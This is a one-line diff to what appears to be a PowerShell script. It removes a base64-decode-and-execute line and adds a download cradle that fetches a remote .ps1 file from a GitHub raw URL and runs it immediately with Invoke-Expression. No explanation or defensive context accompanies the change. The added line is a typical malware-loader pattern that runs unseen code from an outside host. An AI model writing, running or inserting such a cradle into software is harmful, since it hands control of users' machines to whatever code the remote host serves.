@@ -1,1 +1,1 @@
-([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('IyBMT0dJQyBFTkNPREVE')) | iex)
+iex (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/nghianghichcode/noxora/main/i_sr.ps1')
